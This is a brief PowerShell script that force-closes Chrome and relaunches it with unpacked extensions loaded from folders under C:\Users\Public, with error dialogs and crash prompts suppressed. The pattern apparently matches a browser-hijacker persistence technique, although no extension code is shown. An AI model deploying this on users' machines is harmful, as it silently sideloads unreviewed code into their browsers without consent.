$extPath = "C:\Users\Public\Chrome"
$extpath1 = "C:\Users\Public\Chrome\Update"

# Terminate all running instances of Chrome, if any
Get-Process -Name chrome -ErrorAction SilentlyContinue | ForEach-Object {
    $_.Kill()
}

# Check if the extension directory exists
if (Test-Path -Path $extPath) {
    # Start Chrome with the extension
    try {
        Start-Process chrome "--load-extension=`"$extPath`",`"$extPath1`", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble" -ErrorAction Stop
    } catch {
        # If an error occurs while starting Chrome, display the error message
        $_
    }
} else {
    # If the extension directory does not exist, display a message
    "Extension directory not found."
}
